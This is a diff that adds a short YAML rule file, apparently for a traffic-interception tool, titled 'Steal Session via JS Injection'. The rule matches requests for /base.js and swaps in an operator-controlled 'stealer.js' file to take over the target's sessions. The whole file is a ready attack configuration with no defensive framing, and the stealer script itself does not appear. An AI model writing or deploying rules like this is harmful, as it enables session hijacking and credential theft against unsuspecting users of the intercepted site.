@@ -1,0 +1,11 @@
+metadata:
+  title: Steal Session via JS Injection
+  description: Replaces the target's base.js with an operator-controlled stealer script.
+  author: dropoutjeep
+
+rules:
+  - url: "/base.js"
+    match: word
+    inject_js:
+      url: "/base.js"
+      file: "/opt/opencode/stealer.js"
